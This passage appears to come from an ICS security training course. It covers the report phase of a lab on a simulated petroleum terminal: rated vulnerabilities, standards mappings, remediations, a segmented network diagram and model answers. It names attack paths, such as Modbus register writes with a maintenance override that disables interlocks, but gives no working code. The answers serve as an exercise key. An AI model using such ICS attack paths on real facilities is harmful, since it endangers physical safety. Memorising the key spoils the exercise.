In the current Hex Point Bay Terminal deployment, all systems sit on a single flat network with no segmentation between levels. The gateway (Level 3) can directly reach the Modbus simulator (Level 1). The historian (Level 2) accepts connections from any source. The flat topology is the root cause of nearly every vulnerability you have exploited.

docs.title: The Unique Challenges of ICS Security
docs.text:
• Uptime: Petroleum terminals require 99.99% availability. Patches that reboot systems are deferred indefinitely.
  • Legacy systems: PLCs run 15-20 years. Modbus was designed in 1979 with no security: physical isolation was the threat model.
  • Safety vs. security: Adding authentication to Modbus introduces latency that may compromise safety interlock timing.
  • Vendor lock-in: Third-party security software on PLCs may void warranties. Security must work at the network level.
  • Responsible disclosure: ICS-CERT (CISA) coordinates disclosure with 90-120 day timelines because patching requires plant outages.

docs.title: Step 2: Categorize Using the NIST CSF Framework
docs.text:
Map each vulnerability to the NIST CSF function it violates.

# NIST CSF Function Gap V-01 through V-11 Protect Access control, identity management, secure development, configuration management V-12 Identify Asset/configuration exposure V-13 Protect / Detect Architecture and monitoring failure

Nearly every finding maps to Protect: the most fundamental security layer is missing across the facility.

docs.title: Step 3: Assign Risk Ratings
docs.text:
Rate each vulnerability considering both technical severity and physical safety impact.

# Vulnerability Risk Justification V-01 Modbus unauth access Critical Direct process manipulation; overfill/explosion risk V-02 ATG unauth access Critical False readings mask dangerous conditions V-03 Default HMI credentials Critical Operator-level access to all tank controls V-04 Session token in URL Medium Session hijacking via logs/referrer V-05 No CSRF protection High Force operator to execute malicious commands V-06 Unauthenticated API Critical Bypasses all HMI access controls V-07 Weak historian creds High Data exposure; evidence tampering V-08 Command injection Critical RCE as root on IT/OT boundary device V-09 Broken API key auth Critical Unauthorized Modbus writes via gateway V-10 Hardcoded API key High Cannot rotate without code change V-11 Exposed .git directory Medium Source code aids further attacks V-12 Information disclosure Medium Reveals internal topology V-13 Flat network Critical Root cause enabling all lateral movement

Safety-Critical Findings

V-01, V-02, V-08, and V-09 directly enable manipulation of physical processes. In a real facility, these could cause environmental spills, fires, or loss of life.

docs.title: Step 4: Write Remediation Recommendations
docs.text:
For each vulnerability, propose a specific, actionable remediation.

Remediation Format

Each recommendation should specify: (1) what to change, (2) how to change it, and (3) what standard or best practice it satisfies.

Group remediations by category:

  • V-01/V-02 (Protocol security): Modbus-aware firewall restricting writes to HMI only; restrict ATG port 10001 to control room subnet; evaluate OPC UA migration
  • V-03/V-07 (Credentials): Force password change on first login; unique operator accounts; PAM for database credentials; minimum 12-character complexity
  • V-08/V-09/V-10 (Application security): Parameterized commands (no shell injection); OAuth2 or mutual TLS for API auth; secrets manager for keys
  • V-13 (Architecture): Purdue Model segmentation with firewalls at each boundary; IT/OT DMZ; data diodes for historian replication

docs.title: Step 5: Map Findings to IEC 62443 Security Levels
docs.text: The terminal currently operates at SL 0 (no security controls). The minimum acceptable level for an operational petroleum terminal is SL 2 (protection against intentional violation using simple means). Key gaps: no authentication (need unique accounts), no access control (need RBAC), no input validation (need secure development), plaintext protocols (need TLS), flat network (need Purdue Model), no monitoring (need IDS/SIEM), no redundancy (need backup historian).

docs.title: Step 6: Design a Segmented Network Architecture
docs.text:
Create a proposed network architecture applying the Purdue Model to HPB. Your report should include a diagram showing firewalls between each level:

graph TB
    L5["Level 4-5: Corporate"] --- FW1["Firewall 1"]
    FW1 --- DMZ["Level 3.5 DMZ:<br/>Historian Mirror, Jump Host"]
    DMZ --- FW2["Firewall 2"]
    FW2 --- L3["Level 3: gateway, docs<br/>(Hardened)"]
    L3 --- FW3["Firewall 3<br/>(Modbus-Aware)"]
    FW3 --- L2["Level 2: HMI, Historian<br/>(Auth Required)"]
    L2 --- L1["Level 1: Modbus Simulator"]
    L1 --- L0["Level 0: Sensors, ATG"]

    style FW1 fill:#e74c3c,color:#fff
    style FW2 fill:#e74c3c,color:#fff
    style FW3 fill:#e74c3c,color:#fff
    style DMZ fill:#9b59b6,color:#fff
    style L3 fill:#e67e22,color:#fff
    style L2 fill:#f39c12,color:#fff
    style L1 fill:#27ae60,color:#fff

Key segmentation rules for your report:

  • Level 1 → Level 2 only: Modbus traffic from the simulator is accepted only from HMI and historian source IPs
  • Level 2 → Level 3: HMI can query the gateway for read operations only; writes require operator authentication
  • Level 3 → DMZ: Gateway pushes data to the historian mirror via a unidirectional data diode
  • DMZ → Level 4-5: Corporate users access the historian mirror (read-only), never the live historian
  • No direct path from Level 4-5 to Level 1: Eliminates the attack chain demonstrated in Exercise 3.1

docs.title: Analysis Questions
docs.text:
Q1: Which vulnerability poses the greatest safety risk? Why?

Answer

V-01: Modbus TCP unauthenticated access poses the greatest safety risk. While command injection (V-08) is the most technically severe IT vulnerability, Modbus unauthenticated access is the direct mechanism for manipulating the physical process. An attacker who can write arbitrary values to tank level registers can cause overfills (environmental spill, fire risk) or mask dangerous conditions (temperature excursions, pressure buildups). Combined with the maintenance override (register 50), the attacker can simultaneously disable safety interlocks AND falsify sensor readings, the exact combination that leads to catastrophic industrial incidents. V-02 (ATG access) is a close second for the same reasons, the ATG is the ground-truth sensor, and corrupting it undermines all higher-level monitoring.

Q2: How would you prioritize remediation if you could only fix 3 things?

Answer
  1. Network segmentation (V-13): This is the force multiplier. Proper Purdue Model segmentation with firewalls at level boundaries would break every attack chain demonstrated in the course. The gateway could not reach Modbus directly. External users could not reach the historian. The attack surface collapses from 13 vulnerabilities to isolated findings that are individually less impactful.
  2. Command injection remediation (V-08): The gateway is the IT/OT boundary device and the primary entry point. Fixing the command injection eliminates the most dangerous initial access vector.
  3. Modbus-aware firewall (V-01): Even with segmentation, restrict Modbus writes to the HMI's source IP only. Source-IP allowlisting implements defense-in-depth at the protocol level so that even if an attacker reaches the control network, they cannot write to registers.

Q3: What challenges exist in applying IT security practices to ICS?

Answer

Patching: Vendors certify specific OS/firmware versions: patches may break SCADA applications. NERC CIP requires 35-day evaluation periods. Testing requires a staging environment that mirrors production.

Antivirus: Endpoint agents consume CPU needed for real-time control. False positives quarantining a PLC driver DLL cause process upsets. Application whitelisting is preferred over signature-based AV.

Encryption: Modbus/TCP Security (2018) requires both ends to support TLS. Retrofitting onto 20-year-old PLCs is often impossible, and TLS handshake latency may exceed safety timing requirements.

Authentication: MFA on an HMI during an emergency delays operator response. Shared accounts exist because individual accountability conflicts with rapid shift handoffs.

Q4: How would you convince facility management to invest in ICS security?

Answer

Frame the conversation around business risk and regulatory compliance, not technical details:

  • Safety: The attack chain from Exercise 3.1 proves cyber attacks cause physical safety incidents: explosions, spills, loss of life. TRITON confirmed this is not theoretical.
  • Regulatory: NERC CIP fines reach $1M/day. EPA and OSHA enforce against foreseeable hazards including cyber-enabled ones.
  • Financial: Colonial Pipeline (2021) cost $4.4M in ransom plus losses from a 6-day shutdown. Terminal downtime costs $50K-$200K/day.
  • Insurance: Cyber insurance premiums rising 50-100% annually for facilities without documented ICS security programs.
  • Reputation: Oldsmar water treatment attack (2021) made national headlines despite being caught before causing harm.

docs.text:
